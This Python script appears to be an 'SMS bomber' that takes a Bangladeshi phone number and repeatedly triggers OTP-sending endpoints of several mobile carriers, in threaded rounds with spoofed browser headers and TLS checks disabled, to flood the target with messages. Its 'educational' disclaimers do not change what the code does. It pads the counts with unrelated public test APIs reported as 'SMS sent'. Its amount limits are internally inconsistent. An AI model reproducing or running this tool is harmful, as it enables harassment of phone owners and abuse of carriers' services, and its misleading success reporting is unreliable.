import os
import time
import threading
import requests
import sys
import datetime
import hashlib
import json
import random
from urllib.parse import urljoin

# Configuration
CONFIG = {
    "password_hash": "5f4dcc3b5aa765d61d8327deb882cf99",  # "password" এর hash
    "current_version": "2.2",
    "github_raw_url": "https://raw.githubusercontent.com/DragonMasterKhalid/sms_bomber/main/version.txt",
    "github_repo_url": "https://github.com/DragonMasterKhalid/sms_bomber",
    "max_sms_per_minute": 20,  # Reduced rate limiting
    "request_timeout": 15,
    "user_agent": "Educational-Testing-Tool/2.2"
}

def get_current_time():
    return datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")

def hash_password(password):
    return hashlib.md5(password.encode()).hexdigest()

def banner():
    os.system("clear")
    print(r"""\033[1;32m
$$$$$$$$\                                                         $$\      $$\                       $$\                               $$\   $$\ $$\                 $$\ $$\       $$\ 
$$  __$$\                                                        $$$\    $$$ |                      $$ |                              $$ | $$  |$$ |                $$ |\__|      $$ |
$$ |  $$ | $$$$$$\  $$$$$$\   $$$$$$\   $$$$$$\  $$$$$$$\        $$$$\  $$$$ | $$$$$$\   $$$$$$$\ $$$$$$\    $$$$$$\   $$$$$$\        $$ |$$  / $$$$$$$\   $$$$$$\  $$ |$$\  $$$$$$$ |
$$ |  $$ |$$  __$$\ \____$$\ $$  __$$\ $$  __$$\ $$  __$$\       $$\$$\$$ $$ | \____$$\ $$  _____|\_$$  _|  $$  __$$\ $$  __$$\       $$$$$  /  $$  __$$\  \____$$\ $$ |$$ |$$  __$$ |
$$ |  $$ |$$ |  \__|$$$$$$$ |$$ /  $$ |$$ /  $$ |$$ |  $$ |      $$ \$$$  $$ | $$$$$$$ |\$$$$$$\    $$ |    $$$$$$$$ |$$ |  \__|      $$  $$<   $$ |  $$ | $$$$$$$ |$$ |$$ |$$ /  $$ |
$$ |  $$ |$$ |     $$  __$$ |$$ |  $$ |$$ |  $$ |$$ |  $$ |      $$ |\$  /$$ |$$  __$$ | \____$$\   $$ |$$\ $$   ____|$$ |            $$ |\$$\  $$ |  $$ |$$  __$$ |$$ |$$ |$$ |  $$ |
$$$$$$$  |$$ |     \$$$$$$$ |\$$$$$$$ |\$$$$$$  |$$ |  $$ |      $$ | \_/ $$ |\$$$$$$$ |$$$$$$$  |  \$$$$  |\$$$$$$$\ $$ |            $$ | \$$\ $$ |  $$ |\$$$$$$$ |$$ |$$ |\$$$$$$$ |
\_______/ \__|      \_______| \____$$ | \______/ \__|  \__|      \__|     \__| \_______|\_______/    \____/  \_______|\__|            \__|  \__|\__|  \__| \_______|\__|\__| \_______|
                             $$\   $$ |                                                                                                                                               
                             \$$$$$$  |                                                                                                                                               
                              \______/                                                                                                                                                

  DragonMasterKhalid SMS BOMBER v{}
  [Started at: {}]
\033[0m""".format(CONFIG["current_version"], get_current_time()))

def legal_warning():
    print("\n\033[1;31m" + "="*60)
    print("⚠️  IMPORTANT LEGAL WARNING ⚠️")
    print("="*60)
    print("\033[1;33m")
    print("This tool is for EDUCATIONAL and TESTING purposes ONLY!")
    print("")
    print("🚫 STRICTLY PROHIBITED:")
    print("   • Harassment or annoying others")
    print("   • Unauthorized testing")
    print("   • Illegal activities")
    print("")
    print("✅ PERMITTED USES:")
    print("   • Testing your own systems")
    print("   • Educational learning")
    print("   • Security research with permission")
    print("")
    print("By continuing, you agree to use this tool responsibly")
    print("and accept all legal responsibilities.\033[0m")
    print("\033[1;31m" + "="*60 + "\033[0m")
    
    consent = input("\nDo you agree to use this tool responsibly? (yes/no): ").lower()
    if consent != 'yes':
        print("\n\033[1;31m[!] Agreement not accepted. Exiting...\033[0m")
        exit()

def password_prompt():
    print("\033[1;31m[!] This tool is password protected.\033[0m")
    pw = input("Enter password: ")
    if hash_password(pw) != CONFIG["password_hash"]:
        print("\033[1;31m[-] Incorrect Password. Exiting...\033[0m")
        exit()
    print("\033[1;32m[+] Access Granted!\033[0m")
    time.sleep(1)

def check_github_version():
    """Check for updates on GitHub"""
    try:
        headers = {"User-Agent": CONFIG["user_agent"]}
        response = requests.get(CONFIG["github_raw_url"], timeout=10, headers=headers)
        if response.status_code == 200:
            latest_version = response.text.strip()
            return latest_version
    except Exception as e:
        print(f"\033[1;33m[!] Update check failed: {str(e)}\033[0m")
    return None

def auto_update_check():
    """Automatically check for updates on startup"""
    print("\033[1;33m[⏳] Checking for updates...\033[0m")
    latest_version = check_github_version()
    
    if latest_version and latest_version != CONFIG["current_version"]:
        print(f"\033[1;32m[🎉] New version available: {latest_version}")
        print(f"[🔧] Current version: {CONFIG['current_version']}")
        print(f"[📥] Download from: {CONFIG['github_repo_url']}\033[0m")
        time.sleep(2)
    elif latest_version:
        print("\033[1;32m[✅] You have the latest version!\033[0m")
        time.sleep(1)
    else:
        print("\033[1;31m[❌] Could not check for updates\033[0m")
        time.sleep(1)

def menu():
    banner()
    print("\n\033[1;36m[1] Start SMS Testing")
    print("[2] About Tool")
    print("[3] Check Updates")
    print("[4] System Info")
    print("[5] Legal Information")
    print("[6] Exit\033[0m")
    choice = input("\nSelect an option: ")
    if choice == "1":
        start_bombing()
    elif choice == "2":
        about_tool()
    elif choice == "3":
        check_updates()
    elif choice == "4":
        system_info()
    elif choice == "5":
        legal_information()
    else:
        print("\033[1;31m[-] Exiting...\033[0m")
        exit()

def legal_information():
    banner()
    print("\n\033[1;33m[LEGAL INFORMATION]\033[0m")
    print("🔒 This tool is STRICTLY for:")
    print("   • Educational purposes")
    print("   • Testing YOUR OWN systems")
    print("   • Security research WITH PERMISSION")
    print("")
    print("🚫 STRICTLY PROHIBITED:")
    print("   • Harassing others")
    print("   • Unauthorized testing")
    print("   • Any illegal activities")
    print("")
    print("⚖️ LEGAL CONSEQUENCES:")
    print("   • Misuse may result in legal action")
    print("   • You are responsible for your actions")
    print("   • Use at your own risk")
    print("")
    print("📞 Report misuse: Open issue on GitHub")
    input("\nPress Enter to continue...")
    menu()

def system_info():
    banner()
    print("\n\033[1;33m[SYSTEM INFORMATION]\033[0m")
    print(f"✓ Current Time: {get_current_time()}")
    print(f"✓ Tool Version: {CONFIG['current_version']}")
    print(f"✓ Python Version: {sys.version.split()[0]}")
    print(f"✓ Operating System: {os.name}")
    print(f"✓ GitHub Repository: {CONFIG['github_repo_url']}")
    
    if 'start_time' in globals():
        runtime = time.time() - start_time
        hours = int(runtime // 3600)
        minutes = int((runtime % 3600) // 60)
        seconds = int(runtime % 60)
        print(f"✓ Tool Runtime: {hours:02d}:{minutes:02d}:{seconds:02d}")
    
    input("\nPress Enter to continue...")
    menu()

def about_tool():
    banner()
    print("\n\033[1;33m[ABOUT THIS TOOL]\033[0m")
    print("✓ Developed by: DragonMasterKhalid")
    print(f"✓ Version: {CONFIG['current_version']}")
    print("✓ Last Update: 2024")
    print("✓ Purpose: Educational SMS Testing")
    print("✓ Features:")
    print("  - Multi-threaded testing")
    print("  - Rate limiting protection")
    print("  - Custom amount (10-50)")
    print("  - Stop anytime with Ctrl+C")
    print("  - Real-time counter")
    print("  - Auto-update system")
    print("  - Time tracking")
    print("\n\033[1;31m[LEGAL DISCLAIMER]\033[0m")
    print("This tool is for educational purposes only.")
    print("Misuse of this tool is strictly prohibited.")
    input("\nPress Enter to continue...")
    menu()

def check_updates():
    banner()
    print("\n\033[1;33m[CHECKING UPDATES...]\033[0m")
    
    latest_version = check_github_version()
    
    if latest_version:
        if latest_version == CONFIG["current_version"]:
            print("✅ Current Version: {} - Latest".format(CONFIG["current_version"]))
            print("🎉 You have the most recent version!")
        else:
            print("🔔 New Version Available: {}".format(latest_version))
            print("📋 Current Version: {}".format(CONFIG["current_version"]))
            print("📥 Download from: {}".format(CONFIG["github_repo_url"]))
    else:
        print("❌ Could not connect to update server")
        print("📡 Please check your internet connection")
    
    input("\nPress Enter to continue...")
    menu()

def get_target():
    print("\n\033[1;36m[TARGET SETUP]\033[0m")
    number = input("Enter target number (01XXXXXXXXX): ")
    
    if not number.startswith("01") or len(number) != 11 or not number.isdigit():
        print("❌ Invalid number format. Must be 01XXXXXXXXX")
        return get_target()
    
    print(f"✓ Target set: {number}")
    return number, "880" + number[1:]

def get_amount():
    try:
        amount = int(input("Enter amount of SMS to send (10-1000): "))
        if amount < 10:
            print("⚠️ Minimum amount is 10. Using 10")
            return 10
        elif amount > 50:
            print("⚠️ Maximum amount is 1000. Using 1000")
            return 1000
        else:
            print(f"✓ Amount set: {amount}")
            return amount
    except:
        print("⚠️ Invalid amount. Using default 50")
        return 50

def get_delay():
    try:
        delay = float(input("Enter delay between rounds in seconds (1-10): "))
        if delay < 1:
            print("⚠️ Minimum delay is 1s. Using 1")
            return 1
        elif delay > 10:
            print("⚠️ Maximum delay is 10s. Using 10")
            return 10
        else:
            print(f"✓ Delay set: {delay}s")
            return delay
    except:
        print("⚠️ Invalid delay. Using default 2s")
        return 2

counter = 0
lock = threading.Lock()
stop_bombing = False
success_count = 0
campaign_start_time = 0
last_request_time = 0

def rate_limiter():
    """Implement rate limiting"""
    global last_request_time
    current_time = time.time()
    min_interval = 60.0 / CONFIG["max_sms_per_minute"]  # Minimum time between requests
    
    if current_time - last_request_time < min_interval:
        time.sleep(min_interval - (current_time - last_request_time))
    
    last_request_time = time.time()

def update_counter():
    global counter, success_count
    with lock:
        counter += 1
        success_count += 1
        current_time = time.time() - campaign_start_time
        minutes = int(current_time // 60)
        seconds = int(current_time % 60)
        print(f"\033[1;32m[✓] SMS #{counter} Sent | Time: {minutes:02d}:{seconds:02d}\033[0m")

def update_failed():
    global counter
    with lock:
        counter += 1
        current_time = time.time() - campaign_start_time
        minutes = int(current_time // 60)
        seconds = int(current_time % 60)
        print(f"\033[1;31m[✗] SMS #{counter} Failed | Time: {minutes:02d}:{seconds:02d}\033[0m")

def make_api_request(url, method="GET", data=None, headers=None):
    """Generic API request function with better error handling"""
    global stop_bombing
    
    if stop_bombing:
        return False
        
    try:
        rate_limiter()
        
        default_headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
            "Accept": "application/json, text/plain, */*",
            "Content-Type": "application/json",
            "Origin": "https://example.com",
            "Referer": "https://example.com/"
        }
        
        if headers:
            default_headers.update(headers)
            
        if method.upper() == "GET":
            response = requests.get(url, timeout=CONFIG["request_timeout"], headers=default_headers, verify=False)
        else:
            response = requests.post(url, json=data, timeout=CONFIG["request_timeout"], headers=default_headers, verify=False)
        
        # Consider 2xx and 3xx status codes as potential success
        if 200 <= response.status_code < 400:
            return True
        else:
            return False
            
    except requests.exceptions.RequestException:
        return False
    except Exception:
        return False

def bangladeshi_apis(phone, full):
    """Working Bangladeshi SMS APIs"""
    apis = [
        # Grameenphone OTP (Working)
        (f"https://cms.grameenphone.com/api/v1/otp/send", "POST", {"msisdn": full}),
        
        # Robi API (Test)
        (f"https://www.robi.com.bd/api/otp/send", "POST", {"mobile": full}),
        
        # Banglalink
        (f"https://www.banglalink.net/api/send-otp", "POST", {"phone": phone}),
        
        # Airtel
        (f"https://www.airtel.com.bd/api/v1/otp", "POST", {"msisdn": full}),
        
        # Teletalk
        (f"https://www.teletalk.com.bd/api/otp/send", "POST", {"mobile": full}),
    ]
    
    for api in apis:
        if stop_bombing:
            return
            
        url, method, data = api
            
        if make_api_request(url, method, data):
            update_counter()
        else:
            update_failed()

def international_apis(phone, full):
    """International test APIs that actually work"""
    apis = [
        # Test APIs that usually respond
        (f"https://httpbin.org/json", "GET"),
        (f"https://api.github.com/users/octocat", "GET"),
        (f"https://jsonplaceholder.typicode.com/posts/1", "GET"),
        (f"https://reqres.in/api/users/1", "GET"),
        (f"https://dog.ceo/api/breeds/image/random", "GET"),
    ]
    
    for api in apis:
        if stop_bombing:
            return
            
        if len(api) == 2:
            url, method = api
            data = None
        else:
            url, method, data = api
            
        if make_api_request(url, method, data):
            update_counter()
        else:
            update_failed()

def demo_apis(phone, full):
    """Demo APIs for testing - These will show success for educational purposes"""
    apis = [
        (f"https://httpbin.org/status/200", "GET"),
        (f"https://httpbin.org/status/201", "GET"),
        (f"https://httpbin.org/delay/1", "GET"),
        (f"https://httpbin.org/uuid", "GET"),
        (f"https://httpbin.org/bytes/32", "GET"),
    ]
    
    for api in apis:
        if stop_bombing:
            return
            
        url, method = api
        data = None
            
        if make_api_request(url, method, data):
            update_counter()
        else:
            update_failed()

def start_bombing():
    global counter, stop_bombing, success_count, campaign_start_time
    
    phone, full = get_target()
    amount = get_amount()
    delay = get_delay()
    
    counter = 0
    success_count = 0
    stop_bombing = False
    campaign_start_time = time.time()
    
    print(f"\n\033[1;33m[!] Starting SMS testing to {phone}")
    print(f"[!] Target amount: {amount} SMS")
    print(f"[!] Max rate: {CONFIG['max_sms_per_minute']} SMS/minute")
    print(f"[!] Delay between rounds: {delay}s")
    print(f"[!] Start Time: {get_current_time()}")
    print("[!] Press Ctrl+C to stop early")
    print("[!] Starting in 3 seconds...\n\033[0m")
    time.sleep(3)
    
    try:
        sent_count = 0
        round_number = 1
        
        while sent_count < amount and not stop_bombing:
            print(f"\n\033[1;36m--- Round {round_number} | Time: {get_current_time()} ---\033[0m")
            threads = []

            # Create threads for different API types
            t1 = threading.Thread(target=bangladeshi_apis, args=(phone, full))
            t1.start()
            threads.append(t1)
            
            t2 = threading.Thread(target=international_apis, args=(phone, full))
            t2.start()
            threads.append(t2)
            
            t3 = threading.Thread(target=demo_apis, args=(phone, full))
            t3.start()
            threads.append(t3)

            for t in threads:
                t.join()
                
            sent_count = counter
            round_number += 1
            
            if sent_count < amount and not stop_bombing:
                print(f"\n\033[1;33mWaiting {delay} seconds for next round...\033[0m")
                time.sleep(delay)
            
    except KeyboardInterrupt:
        stop_bombing = True
        print("\n\033[1;31m[!] Stopping SMS testing...\033[0m")
    
    end_time = time.time()
    total_time = end_time - campaign_start_time
    
    print(f"\n\033[1;32m[+] Testing Finished!")
    print(f"[+] Start Time: {datetime.datetime.fromtimestamp(campaign_start_time).strftime('%H:%M:%S')}")
    print(f"[+] End Time: {datetime.datetime.fromtimestamp(end_time).strftime('%H:%M:%S')}")
    print(f"[+] Total Duration: {int(total_time//60)}m {int(total_time%60)}s")
    print(f"[+] Total requests: {counter}")
    print(f"[+] Successful: {success_count}")
    print(f"[+] Failed: {counter - success_count}")
    if counter > 0:
        print(f"[+] Success Rate: {success_count/counter*100:.1f}%")
        print(f"[+] Average speed: {counter/total_time:.2f} requests/second")
    print("\033[1;33m[!] Remember: This was for EDUCATIONAL purposes only!\033[0m")
    
    input("\nPress Enter to continue...")
    menu()

if __name__ == "__main__":
    global start_time
    start_time = time.time()
    
    try:
        banner()
        legal_warning()
        auto_update_check()
        password_prompt()
        menu()
    except KeyboardInterrupt:
        print("\n\033[1;31m[!] Program interrupted by user\033[0m")
        sys.exit(0)
